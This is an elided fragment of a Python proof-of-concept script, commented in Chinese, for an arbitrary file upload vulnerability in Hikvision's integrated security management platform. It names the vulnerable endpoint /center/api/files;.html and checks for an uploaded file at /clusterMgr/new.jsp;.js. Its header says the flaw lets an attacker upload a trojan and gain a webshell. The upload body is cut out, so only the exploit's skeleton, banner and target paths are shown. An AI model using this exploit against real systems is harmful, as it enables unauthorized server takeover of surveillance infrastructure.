#HiKVISION 综合安防管理平台 files 接口存在任意文件上传漏洞
#HiKVISION综合安防管理平台 /center/api/files;.html 接口存在任意文件上传漏洞，攻击者可以通过漏洞上传木马到服务器中，获得webshell。
 ...
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒      ░▀▀▒ 
  ...
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░         ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░        ░    
                                    ...
                                    @author:           sawa
                                    @version:          1.0.0
                                    For:               HiKVISION 综合安防管理平台 files 任意文件上传漏洞
"""
    print(banner)
...
def main():
    banner()
    parser = argparse.ArgumentParser(description="This is a HiKVISION 综合安防管理平台 files 任意文件上传vulnerability")
...
# poc模块
def poc(target):
    payload_url ="/center/api/files;.html"
    ...
    try:
        ...
        result = target + '/clusterMgr/new.jsp;.js'
        if  res.status_code == 200 and "test3" in res.text:
